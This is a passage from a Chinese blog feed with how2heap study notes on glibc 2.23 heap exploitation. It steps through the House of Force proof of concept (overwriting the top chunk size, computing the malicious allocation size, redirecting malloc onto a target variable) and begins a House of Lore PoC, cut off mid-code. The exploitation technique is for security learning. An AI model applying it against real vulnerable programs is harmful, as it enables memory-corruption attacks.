id=\"2调试程序-5\"><a class=\"anchor\" href=\"#2调试程序-5\">#</a> 2. 调试程序</h2>\n<h3 id=\"1执行到31行打印区间变量地址\"><a class=\"anchor\" href=\"#1执行到31行打印区间变量地址\">#</a> 1. 执行到 31 行，打印区间变量地址</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nWelcome to the House of Force\\n\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"The top chunk is a special chunk. Is the last in memory \"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token string\">\"and is the chunk that will be resized when malloc asks for more space from the os.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nIn the end, we will use this to overwrite a variable at %p.\\n\"</span><span class=\"token punctuation\">,</span> bss_var<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Its current value is: %s\\n\"</span><span class=\"token punctuation\">,</span> bss_var<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/8B%605%7BHN%7B_%7D9JVDDAPQ%7D%24INL.png\" alt=\"\" /><br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/QW_GHBNDBF9%7BJO4SQ5L94_6.png\" alt=\"\" /></p>\n<p>查看具体值，这里就是我们需要利用本次漏洞改写的地方：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/6383MI4RX2I%40V5937_W1U66.png\" alt=\"\" /></p>\n<h3 id=\"2执行到37行\"><a class=\"anchor\" href=\"#2执行到37行\">#</a> 2. 执行到 37 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nLet's allocate the first chunk, taking space from the wilderness.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token class-name\">intptr_t</span> <span class=\"token operator\">*</span>p1 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"The chunk of 256 bytes has been allocated at %p.\\n\"</span><span class=\"token punctuation\">,</span> p1 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>申请一个 smallbin，由于现在 bin 中没有 chunk，所以会从 topchunk 上切割出一个，然后输出其起始地址（从 <code>pre_size</code>  开始）这里打印的地址是 <code>0x555555759000</code> <br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/E%40D%29%2847ZXQ2QJ01%7D33%24%5DP19.png\" alt=\"\" /></p>\n<h3 id=\"3执行到41行\"><a class=\"anchor\" href=\"#3执行到41行\">#</a> 3. 执行到 41 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">int</span> real_size <span class=\"token operator\">=</span> <span class=\"token function\">malloc_usable_size</span><span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Real size (aligned and all that jazz) of our allocated chunk is %ld.\\n\"</span><span class=\"token punctuation\">,</span> real_size <span class=\"token operator\">+</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>计算 chunk p1 所占的真实大小（包括头部的 0x10），原本申请的是 0x100</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/VKSEZGAM%29NOZ%60X%259Y%241AQO1.png\" alt=\"\" /></p>\n<h3 id=\"4执行到47行\"><a class=\"anchor\" href=\"#4执行到47行\">#</a> 4. 执行到 47 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">intptr_t</span> <span class=\"token operator\">*</span>ptr_top <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>p1 <span class=\"token operator\">+</span> real_size <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//??</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nThe top chunk starts at %p\\n\"</span><span class=\"token punctuation\">,</span> ptr_top<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>一开始我不明白为什么要减去一个 sizeof (long)，但是在调试上一步时，发现给的 <code>real_size</code>  将 topchunk 的 pre_size 位也算入了进去，所以才要减掉这一部分才刚好是 topchunk 的头部</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/JJXO%7EGTX%257M%7D%7EV%5B%25%7DQJQ5LV.png\" alt=\"\" /><br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/U%600R3%7BRB51ARV_5S%600%25YUUF.png\" alt=\"\" /></p>\n<h3 id=\"5执行到52行\"><a class=\"anchor\" href=\"#5执行到52行\">#</a> 5. 执行到 52 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Old size of top chunk %#llx\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>ptr_top <span class=\"token operator\">+</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>ptr_top <span class=\"token operator\">+</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"New size of top chunk %#llx\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>ptr_top <span class=\"token operator\">+</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这一部分输出了 top chunk 的 size 位的值，然后通过将这个值置为 - 1，就会变为最大的值（因为是无符号数会产生回绕），然后打印新的 size 值；这里这样做是为了进行绕过检测</p>\n<p>从下面可以看出 size 已经变成了最大值<br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/3%7EHC9V%608%5D%296V%5B%7B%24JYLKLY%24I.png\" alt=\"\" /><br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%5B_8L%24HQJ9NS%5DP5Q%5DR3D8%7DBF.png\" alt=\"\" /></p>\n<h3 id=\"6执行到72行\"><a class=\"anchor\" href=\"#6执行到72行\">#</a> 6. 执行到 72 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t * new_top = old_top + nb</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t * nb = new_top - old_top</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t * req + 2sizeof(long) = new_top - old_top</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t * req = new_top - old_top - 2sizeof(long)</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t * req = dest - old_top - 4*sizeof(long)</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t */</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> evil_size <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>bss_var <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">4</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>ptr_top<span class=\"token punctuation\">;</span>  <span class=\"token comment\">//evil_size 是将目的地址前面的地址空间全部申请出去</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\\n\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t   <span class=\"token string\">\"we will malloc %#lx bytes.\\n\"</span><span class=\"token punctuation\">,</span> bss_var<span class=\"token punctuation\">,</span> ptr_top<span class=\"token punctuation\">,</span> evil_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>new_ptr <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>evil_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"As expected, the new pointer is at the same place as the old top chunk: %p\\n\"</span><span class=\"token punctuation\">,</span> new_ptr <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里做出计算，来将下一次申请的 chunk 构造成正好是我们想要修改地址（dest-0x10 为其目的地址的头部地址）</p>\n<p>注释给了计算方式，这里再解释一下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>new_top <span class=\"token operator\">=</span> old_top <span class=\"token operator\">+</span> nb <span class=\"token comment\">// 更新 top chunk 为申请 nb 后的 chunk（nb 为申请的 chunk）</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t nb <span class=\"token operator\">=</span> new_top <span class=\"token operator\">-</span> old_top <span class=\"token comment\">// 反推得 nb 的大小，这里新的 top chunk 可以通过想要申请的目的地址 - 0x10（到其头部）来得到</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t req <span class=\"token operator\">+</span> <span class=\"token number\">2</span>sizeof<span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> new_top <span class=\"token operator\">-</span> old_top <span class=\"token comment\">// 这里 req 也就是申请 nb 实际的 size 大小（不包含头部）</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t req <span class=\"token operator\">=</span> new_top <span class=\"token operator\">-</span> old_top <span class=\"token operator\">-</span> <span class=\"token number\">2</span>sizeof<span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t req <span class=\"token operator\">=</span> dest <span class=\"token operator\">-</span> <span class=\"token number\">2</span>sizeof<span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> old_top <span class=\"token operator\">-</span> <span class=\"token number\">2</span>sizeof<span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 目的地址 (dest)=new top_chunk-0x10</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t req <span class=\"token operator\">=</span> dest <span class=\"token operator\">-</span> old_top <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token operator\">*</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token comment\">// 可以通过下面的推到理解</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token comment\">//old_top+(req+0x10)=dest-0x10</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token comment\">//req=dest-old_top-0x20</span></pre></td></tr></table></figure><p>示例中的 <code>eval_size</code>  也就是 req</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%7DO%29%28MRXZNCG%25T%242MCSWAK0K.png\" alt=\"\" /></p>\n<p>可以发现申请完 <code>eval_size</code>  就到了我们的目的地址了</p>\n<h3 id=\"7执行到84行\"><a class=\"anchor\" href=\"#7执行到84行\">#</a> 7. 执行到 84 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span><span class=\"token operator\">*</span> ctr_chunk <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nNow, the next chunk we overwrite will point at our target buffer.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"malloc(100) => %p!\\n\"</span><span class=\"token punctuation\">,</span> ctr_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now, we can finally overwrite that value:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"... old string: %s\\n\"</span><span class=\"token punctuation\">,</span> bss_var<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"... doing strcpy overwrite with \\\"YEAH!!!\\\"...\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>ctr_chunk<span class=\"token punctuation\">,</span> <span class=\"token string\">\"YEAH!!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"... new string: %s\\n\"</span><span class=\"token punctuation\">,</span> bss_var<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>ctr_chunk <span class=\"token operator\">==</span> bss_var<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里接着申请 chunk，就可以申请到要修改的地址，然后修改他的值</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%40KJ55%7E%40A_%5BOH%7EJ0L%25%5BVPP%280.png\" alt=\"\" /><br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/A_%28HU82U%241HQUBAXH4%60QG%291.png\" alt=\"\" /><br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%60%5B34VQD%7D%5B%5DQND%40H03XAEA4A.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/XHN366L2YQR1G_A%24RIEA%29O0.png\" alt=\"\" /></p>\n<p>成功修改了值，而且最后也绕过了判断 <code>assert(ctr_chunk == bss_var);</code></p>\n<h3 id=\"8关于讨论\"><a class=\"anchor\" href=\"#8关于讨论\">#</a> 8. 关于讨论</h3>\n<p>后面的讨论是介绍使 top chunk 指向 got 表的方法</p>\n<p>参考：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzU0MjE4ODMzL2FydGljbGUvZGV0YWlscy8xMjI4NjgyNzI=\">https://blog.csdn.net/qq_54218833/article/details/122868272</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pbmZvc2Vjd3JpdGV1cHMuY29tL3RoZS10b2RkbGVycy1pbnRyb2R1Y3Rpb24tdG8taGVhcC1leHBsb2l0YXRpb24tZmFzdGJpbi1kdXAtY29uc29saWRhdGUtcGFydC00LTItY2U2ZDY4MTM2YWE4\">https://infosecwriteups.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cua29uZ2hhaWRhc2hpLmNvbS9wb3N0LzUwODAuaHRtbA==\">https://www.konghaidashi.com/post/5080.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTDBnNG4tYmxvZy9wLzE0MDMxMzA1Lmh0bWw=\">https://www.cnblogs.com/L0g4n-blog/p/14031305.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9ob3VzZS1vZi1laW5oZXJqYXIv\">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-einherjar/</span></p>\n<p>[ <code>house_of_force</code>  参考]：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWklLSDI2L2FydGljbGVzLzE2NTMzMzg4Lmh0bWw=\">https://www.cnblogs.com/ZIKH26/articles/16533388.html</span></p>\n",
            "tags": [
                "how2heap"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/10/19/pwn/%E4%B8%93%E6%A0%8F/how2heap%202.23(2)/",
            "url": "https://vvwwvv.cn/2023/10/19/pwn/%E4%B8%93%E6%A0%8F/how2heap%202.23(2)/",
            "title": "how2heap(glibc2.23（2）)",
            "date_published": "2023-10-19T11:23:15.000Z",
            "content_html": "<p>本来想着一篇文章写完 glibc2.23how2heap 系列，但是太长了，还是分开写吧</p>\n<h1 id=\"6house_of_gods还没搞明白先挖个坑\"><a class=\"anchor\" href=\"#6house_of_gods还没搞明白先挖个坑\">#</a> 6. <code>house_of_gods</code> 【还没搞明白，先挖个坑】</h1>\n<h1 id=\"7house_of_lore\"><a class=\"anchor\" href=\"#7house_of_lore\">#</a> 7. <code>house_of_lore</code></h1>\n<p>这个漏洞就是利用了申请 samll bin 后会将 bk 指到下个 chunk 上，如果这个 chunk 是我们想要控制的那么我们就可以申请回来然后利用，在要控制处伪造 chunk，使他的 fd 指向 small bin 的 chunk 即可绕过检测（一开始在想既然能直接该想要修改处的值，还伪造干嘛；后面发现这里能改写但是无法 getshell，伪造后能利用其返回的 ret 来 getshell）</p>\n<h2 id=\"1程序源码\"><a class=\"anchor\" href=\"#1程序源码\">#</a> 1. 程序源码</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Advanced exploitation of the House of Lore - Malloc Maleficarum.</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>This PoC take care also of the glibc hardening of smallbin corruption.</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>[...]</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>// 这一部分在 glibc 源代码的 3414 行，是在申请 smallbin 时执行</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>else</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    &#123;</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      bck = victim->bk;//bck 为要申请出去的 chunk 的 bk 指向的 chunk</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    if (__glibc_unlikely (bck->fd != victim))&#123;</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>     // 检测 smallbin 的双链表</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                  errstr = \"malloc (): smallbin double linked list corrupted\";</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                  goto errout;</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                &#125;</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>       set_inuse_bit_at_offset (victim, nb);// 设置 smallbin 的 inuse 位，nb 为申请的大小（包括头部）</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>       bin->bk = bck;//bin 就是 victim 的 fd 指向的 chunk</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>       bck->fd = bin;// 这里就是从双链表摘除 victim 进行的操作</pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>       [ ... ]</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;assert.h></span></span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">jackpot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Nice jump d00d\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token 